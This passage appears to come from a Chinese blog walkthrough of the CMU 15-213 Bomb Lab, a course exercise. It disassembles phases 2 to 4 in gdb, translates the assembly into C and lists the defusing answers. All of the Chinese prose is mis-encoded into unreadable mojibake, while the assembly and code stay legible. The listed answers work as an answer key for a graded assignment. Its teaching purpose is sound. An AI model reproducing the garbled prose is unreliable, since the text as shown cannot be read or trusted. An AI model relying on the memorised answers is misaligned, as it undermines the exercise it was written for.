addè¡Œï¼‰ï¼Œå°†%rbxçš„å€¼è½¬å˜ä¸º%rbx+0x4ï¼Œå†æ¯”è¾ƒ%rbxå’Œ%rbpçš„å€¼ã€‚</li><li>å¦‚æœä¸ç›¸ç­‰ï¼Œè·³è½¬åˆ°0x400f17ï¼ˆ+27  movè¡Œï¼‰ï¼Œå½¢æˆå¾ªç¯</li><li>å¦‚æœç›¸ç­‰ï¼Œè·³è½¬åˆ°0x400f3cï¼ˆ+64  addè¡Œï¼‰ï¼Œå°†%rsp+0x28ï¼ˆå‡å°40å­—èŠ‚ï¼‰ï¼Œ%rbxï¼Œ%rbpå‡ºæ ˆï¼Œé€€å‡ºç¨‹åºã€‚</li></ol><p>æˆ‘ä»¬å°è¯•ç¿»è¯‘ä¸ºCè¯­è¨€ä»£ç ï¼šè¿™é‡Œç”±äºæ•°æ®ç±»å‹ä¸ºintï¼Œæ•…åœ°å€æ“ä½œ%rsp+4è½¬æ¢ä¸ºæŒ‡é’ˆä¾¿ä¸ºrsp+1.å…¶å®ƒåœ°æ–¹ä¹Ÿè¿›è¡Œäº†ç›¸åŒçš„å¤„ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">phase2</span><span class="hljs-params">(<span class="hljs-type">int</span> *rsp)</span> <br>&#123;<br>    <span class="hljs-type">int</span> *rbx, *rbp, eaxï¼›<br>    <span class="hljs-keyword">if</span>(*rsp == <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> L2;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        explode_bomb();<br>    &#125;<br>L2:<br>    rbx = rsp+<span class="hljs-number">1</span>;<br>    rbp = rsp+<span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">goto</span> L3;<br>L3:<br>    eax = *(rbx<span class="hljs-number">-1</span>);<br>    eax *= <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span>(eax == *rbx)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> L4;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        explode_bomb();<br>    &#125;<br>L4:<br>    rbx = rbx+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(rbx != rbp)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> L3;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>        <br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç»§ç»­æŸ¥çœ‹å…³é”®å‡½æ•°<code>read_six_numbers</code>çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">=&gt; 0x0000000000400efc &lt;+0&gt;:     push   %rbp<br>   0x0000000000400efd &lt;+1&gt;:     push   %rbx<br>   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp<br>   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi<br>   0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;<br>   # ä¸‹é¢æ³¨æ„%rsi=%rsp<br>Dump of assembler code for function read_six_numbers:<br>=&gt; 0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp  #ç”³è¯·ç©ºé—´<br>   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx#å°†%rsièµ‹å€¼ç»™%rdx<br>   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx#å°†%rsi+4çš„åœ°å€å­˜å…¥%rcx<br>   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax#å°†%rsi+20çš„åœ°å€å­˜å…¥%rax<br>   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)#å°†%raxèµ‹å€¼ç»™%rsp+8<br>   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax#å°†%rsi+16çš„åœ°å€å­˜å…¥%rax<br>   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)#å°†raxçš„å€¼èµ‹ç»™%rspæŒ‡å‘çš„åœ°å€<br>   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9#å°†%rsi+12å­˜å…¥%r9<br>   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8#å°†%rsi+8å­˜å…¥%r8<br>   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi#å°†$0x4025c3èµ‹ç»™%esi<br>   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax#å°†0èµ‹ç»™%eax<br>   0x000000000040148a &lt;+46&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax#æ¯”è¾ƒ%eaxçš„å€¼å’Œ0x5<br>   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;<br>   0x0000000000401494 &lt;+56&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp#å›æ”¶ç©ºé—´<br>   0x000000000040149d &lt;+65&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p><strong>__isoc99_sscanf å‡½æ•°</strong>ï¼š</p><ul><li><code>__isoc99_sscanf</code> æ˜¯ <code>sscanf</code> å‡½æ•°çš„å®ç°ï¼Œå®ƒç”¨äºä»å­—ç¬¦ä¸²ä¸­è§£ææ ¼å¼åŒ–è¾“å…¥ã€‚</li><li><code>sscanf</code> å‡½æ•°çš„åŸå‹ä¸ºï¼š<code>int sscanf(const char *str, const char *format, ...);</code>ï¼Œå®ƒä» <code>str</code> ä¸­è¯»å–æ•°æ®å¹¶æ ¹æ® <code>format</code> å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå°†ç»“æœå­˜å‚¨åœ¨åé¢çš„å‚æ•°ä¸­ã€‚</li><li>è¿”å›å€¼æ˜¯è§£ææˆåŠŸçš„é¡¹æ•°ï¼Œå‚¨å­˜åœ¨<code>%rax</code>ä¸­ï¼Œæ­¤å¤„å…±6é¡¹ï¼Œæ‰€ä»¥æœ‰ä¸€ä¸ªè§£æé¡¹æ•°ä¸æ»¡è¶³å¤§äº5åˆ™çˆ†ç‚¸çš„æŒ‡ä»¤ã€‚</li></ul><p>ç»è¿‡è®¡ç®—ï¼Œæˆ‘ä»¬å‘ç°<code>sscanf</code>å°†è§£æç»“æœ<strong>æŒ‰ç…§é¡ºåºä¾æ¬¡æŒ‡å‘äº†å†…å­˜ä¸­ä¸€æ®µè¿ç»­çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä»<code>%rsi</code>å¼€å§‹å¢é•¿çš„æ•°ç»„ï¼š <code>%rdx</code>ï¼ˆ<code>%rsi</code> æŒ‡å‘çš„åœ°å€ï¼‰ã€<code>%rcx</code>ï¼ˆ<code>%rsi + 4</code>ï¼‰ã€<code>%r8</code>ï¼ˆ<code>%rsi + 8</code>ï¼‰ã€<code>%r9</code>ï¼ˆ<code>%rsi + 12</code>ï¼‰ã€<code>%rsp</code>ï¼ˆ<code>%rsi + 16</code>ï¼‰ã€<code>%rsp + 8</code>ï¼ˆ<code>%rsi + 20</code>ï¼‰æŒ‡å‘çš„å†…å­˜ä½ç½®ã€‚</strong>è€Œå®é™…ä¸Šï¼Œ<code>read_six_numbers</code>å‡½æ•°æ‰§è¡Œå®Œæˆå›æ”¶å†…å­˜ç©ºé—´åï¼Œå—åˆ°<code>%rsi=%rsp</code>çš„é™åˆ¶ï¼Œæ•°ç»„å®é™…ä¸Šæ˜¯ä»<code>%rsp</code>å¼€å§‹ã€‚</p><p>çŸ¥é“è¿™ä¸€ç‚¹åï¼Œæˆ‘ä»¬å›è¿‡å¤´çœ‹phase_2å‡½æ•°ï¼šç¬¬ä¸€ä¸ªåˆ¤æ–­é™åˆ¶äº†ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯%rspå¿…é¡»ä¸º1.</p><p>ç”»å›¾åˆ†æï¼Œå®é™…ä¸ŠåŸå§‹ä»£ç å¯ä»¥ç®€åŒ–ä¸ºä¸€ä¸ªforå¾ªç¯ï¼š</p><p><img src="/Pictures/CMU15-213/Bomb.jpg"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">phase2</span><span class="hljs-params">(<span class="hljs-type">int</span> *rsp)</span><br>&#123;<br>    rsp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> rbp=<span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> rbx=<span class="hljs-number">1</span>;rbx &lt; rbp; rbx++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(rsp[rbx] != <span class="hljs-number">2</span>*rsp[rbx<span class="hljs-number">-1</span>])<br>        &#123;<br>            explode_bomb();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>äºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†phase_2çš„å¯†ç ï¼š1 2 4 8 16 32.</p><h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h3><p>ä¾ç„¶æ˜¯å…ˆæ‰“æ–­ç‚¹å’Œæ£€éªŒç­”æ¡ˆï¼Œå‘ç°æ— è¯¯ã€‚æå–phase_3çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_3:<br>=&gt; 0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp#ç”³è¯·ç©ºé—´<br>   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx#%rcx=%rsp+0xc<br>   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx#%rdx=%rsp+0x8<br>   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi#%esi=$ox4025cf<br>   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax#%eax=0x0<br>   0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax#æ¯”è¾ƒ%eaxå’Œ0x1,%eaxä¸ºè§£æç»“æœ<br>   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;#%eaxå¤§äº1è·³è½¬<br>   0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;#%eaxå°äº1å¼•çˆ†<br>   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)#æ¯”è¾ƒ*(%rsp+8)ä¸7<br>   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;#å¤§äº7è·³è½¬ï¼Œå¼•çˆ†<br>   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax#å°äº7%eax=*(%rsp+8)<br>   0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)#è·³*(0x402470+8%rax)<br>   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax#%eax=0xcf<br>   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax#%eax=0x2c3<br>   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax#%eax=0x100<br>   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax#%eax=0x185<br>   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax#%eax=0xce<br>   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax#%eax=0x2aa<br>   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax#%eax=0x147<br>   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax#%eax=0x0<br>   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax#%eax=0x137<br>   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax#æ¯”è¾ƒ%eaxå’Œ*(rsp+0xc)<br>   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;#ç›¸ç­‰è·³è½¬ç»“æŸ<br>   0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;#ä¸ç­‰çˆ†ç‚¸<br>   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp<br>   0x0000000000400fcd &lt;+138&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„ï¼Œä¸€æ¬¡æ˜¯æ— æ³•æ˜¾ç¤ºå…¨éƒ¨ä»£ç çš„ã€‚æˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸€æ¬¡RETç›´åˆ°æ˜¾ç¤º<code>End of assembler dump.</code>æ‰ç®—å®Œæˆã€‚</p><p>è¿˜æ˜¯ç»§ç»­åˆ†æè¿™æ®µä»£ç çš„é€»è¾‘ï¼Œå‰æ®µè°ƒç”¨<code>sscanf</code>ï¼Œè€Œåˆ¤æ–­eaxæ˜¯å¦å¤§äº1è¯´æ˜<code>sccanf</code>è§£æå‡ºä¸¤ä¸ªç»“æœï¼Œå­˜æ”¾åœ¨<code>%rdx(%rsp+8)</code>å’Œ<code>%rcx(%rsp+12)</code>ä¸­ã€‚è€Œformatå­˜æ”¾åœ¨åœ°å€$0x4025cfå¤„ï¼Œæˆ‘ä»¬è§£è¯»ä¸€ä¸‹ï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">(gdb) <span class="hljs-keyword">print</span> (char*) <span class="hljs-number">0x4025cf</span><br>$1 = <span class="hljs-number">0x4025cf</span> <span class="hljs-string">&quot;%d %d&quot;</span><br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸¤ä¸ªæ•´æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸‰å…³çš„å¯†ç æ˜¯ä¸¤ä¸ªæ•´æ•°ï¼Œè§£æå®Œæˆå<code>%eax=2</code>ã€‚</p><p>ç„¶åæˆ‘ä»¬è§‚å¯Ÿ+39è¡Œï¼Œæ¯”è¾ƒå¤§äº7ä¼šå¼•çˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ•°ä¸€å®šä¸å¤§äº7.ä¹‹åå°†ç¬¬ä¸€ä¸ªæ•°èµ‹å€¼ç»™<code>%eax</code>ï¼Œå¹¶è·³è½¬åˆ°<code>*(0x402470+8%rax)</code>å¤„ï¼Œè¿™é‡Œç”±äºç½®é›¶ï¼Œ<code>%rax=%eax</code>ã€‚</p><p>è·³è½¬ä¹‹åä¸‹é¢çš„ä»£ç éƒ½æ˜¯ä¸€è¡Œèµ‹å€¼ä¸€è¡Œè·³è½¬ã€‚æˆ‘ä»¬èšç„¦äºæœ€åç»“æŸçš„æ¡ä»¶ï¼š<code>æ¯”è¾ƒ%eaxå’Œ*(rsp+0xc)</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·³è½¬çš„<code>*(0x402470+8%rax)</code>ä¼šå‘Šè¯‰æˆ‘ä»¬è·³è½¬åˆ°å…¶ä¸­ä¸€è¡Œï¼Œç»™<code>%eax</code>èµ‹å€¼åä½¿å…¶äºç¬¬äºŒä¸ªæ•°ç›¸ç­‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¬¬äºŒä¸ªæ•°å°±æ˜¯ä¸Šé¢<code>%eax</code>èµ‹å€¼çš„æ•°çš„å…¶ä¸­ä¹‹ä¸€ã€‚</p><p>å…¶å®åšåˆ°è¿™ä¸€æ­¥ï¼Œç”±äºæˆ‘ä»¬çŸ¥é“ç¬¬ä¸€ä¸ªæ•°ä¸å¤§äº7ï¼Œç¬¬äºŒä¸ªæ•°åœ¨ä¸Šé¢çš„èµ‹å€¼ä¸­ï¼Œå·²ç»å¯ä»¥ç©·ä¸¾äº†ğŸ¤£ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å…ˆå»æ‰¾åˆ°<code>*(0x402470+8%rax)</code>çš„åœ°å€ã€‚</p><p>æˆ‘ä»¬æŠŠç¬¬ä¸€ä¸ªæ•°ä»0åˆ°7ä¾æ¬¡èµ‹å€¼ï¼Œå¥½å§ï¼Œå…¶å®è¿™é“é¢˜å¤šè§£ã€‚è§£æå‡ºæ¥å‘ç°å…¶å®æ¯ä¸€ä¸ªå€¼æ­£å¥½å¯¹åº”äº†ä¸€ä¸ªèµ‹å€¼è¯­å¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) print /x *0x402470<br>$1 = 0x400f7c<br></code></pre></td></tr></table></figure><p>è€Œ<code>0x400f7c</code>å¯¹åº”çš„è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax#%eax=0xcf<br>0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br></code></pre></td></tr></table></figure><p>æ•…è¿™ä¸€ç»„ç­”æ¡ˆä¸º<code>0 207</code></p><p>ç»™å‡ºæ‰€æœ‰å…«ç»„ç­”æ¡ˆï¼š</p><p>0 207ï¼›1 311ï¼›2 707ï¼›3 256ï¼›4 389ï¼›5 206ï¼›6 682ï¼›7 327ã€‚</p><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h3><p>æ‰“æ–­ç‚¹è§£æï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_4:<br>=&gt; 0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp<br>   0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx<br>   0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx<br>   0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi<br>   0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax<br>   0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>   0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax#æ¯”è¾ƒ%eaxå’Œ2<br>   0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;#ä¸ç›¸ç­‰è·³è½¬ï¼Œçˆ†<br>   0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)#æ¯”è¾ƒç¬¬ä¸€ä¸ªæ•°å’Œ14<br>   0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;#å°äºç­‰äºè·³è½¬<br>   0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx#%edx=14<br>   0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi#%esi=0<br>   0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi#%edi=ç¬¬ä¸€ä¸ªæ•°<br>   0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;<br>   0x000000000040104d &lt;+65&gt;:    test   %eax,%eax#æ£€æµ‹æ­£è´Ÿ<br>   0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;#éé›¶çˆ†ç‚¸<br>   0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)#æ¯”è¾ƒç¬¬äºŒä¸ªæ•°å’Œ0<br>   0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;#ç›¸ç­‰ç»“æŸ<br>   0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp<br>   0x0000000000401061 &lt;+85&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>å¾ˆåƒå•Šï¼Œå’Œphase_3ï¼Œè¿formatéƒ½æ˜¯ç”¨çš„åŒä¸€ä¸ªã€‚æ‰€ä»¥è¿™æ¬¡çš„å¯†ç ä¹Ÿæ˜¯ä¸¤ä¸ªæ•´æ•°ã€‚ç”±å·²çŸ¥ä¿¡æ¯ï¼Œç¬¬ä¸€ä¸ªæ•°å°äºç­‰äº14ï¼Œè€Œç¬¬ä¸€ã€äºŒä¸ªæ•°è¦ä¸º0ï¼ˆç»è¿‡func4åï¼‰.</p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå…³é”®ä¸­é—´å‡½æ•°<code>func4</code>ï¼Œæˆ‘ä»¬è°ƒå‡ºæ¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function func4:<br>=&gt; 0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp<br>   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax#%eax=%edx=14<br>   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax#%eax -= %esiï¼Œè€Œ%esi=0<br>   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx#%ecx=%eax=14<br>   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx#é€»è¾‘å³ç§»%ecxä¸­31ä½<br>   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax#%eax += %ecx<br>   0x0000000000400fdd &lt;+15&gt;:    sar    %eax#%eax=%eax/2<br>   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx#%ecx=%rax+%rsi<br>   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx#æ¯”è¾ƒ%ecxå’Œ%edi<br>   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;#å°äºç­‰äºè·³è½¬<br>   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx#å¤§äº%edx=%rcx-1<br>   0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;#é€’å½’è°ƒç”¨<br>   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax#%eax*=2<br>   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;#è·³è½¬ï¼Œç»“æŸ<br>   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax#%eax=0<br>   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx#æ¯”è¾ƒ%ecxä¸%edi<br>   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;#å¤§äºç­‰äºï¼Œç»“æŸ<br>   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi#å¦åˆ™%esi=%rcx+1<br>   0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;#é€’å½’è°ƒç”¨<br>   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax#%eax=2%rax+1<br>   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp<br>   0x000000000040100b &lt;+61&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ<code>func4</code>ä¸­æ²¡æœ‰æ¶‰åŠåˆ°<code>%rsp+0xc</code>ä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªæ•°çš„ä½ç½®ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿èƒ½ç¡®å®šç¬¬äºŒä¸ªæ•°å°±æ˜¯0.å¯¹äºç¬¬ä¸€ä¸ªæ•°ï¼Œéœ€è¦ç¡®å®šä»€ä¹ˆæ ·çš„è¾“å…¥æ‰èƒ½ä½¿<code>func4</code>è¿”å›0.è¿™æ®µå‡½æ•°ç”±äºæ¶‰åŠä¸¤éƒ¨åˆ†çš„é€’å½’è°ƒç”¨ï¼Œè¾ƒä¸ºå¤æ‚ã€‚ç¬”è€…åˆå§‹å‡è®¾ç¬¬ä¸€ä¸ªæ•°ä¸º0å‘ç°èƒ½å¤Ÿå¾—åˆ°è¿”å›å€¼ä¸º0.ä¹Ÿå°±æ˜¯è¯´0 0ä¸ºä¸€ç»„è¾ƒæ˜æ˜¾çš„ç­”æ¡ˆã€‚å®é™…ä¸Šæœ‰ä¸å¤§äº14çš„é™åˆ¶ï¼Œé€ä¸ªä»£å…¥ä¹Ÿèƒ½è§£å‡ºå…¨è§£ã€‚ä½†è¿™é‡Œå°è¯•è½¬æ¢ä¸ºCä»£ç 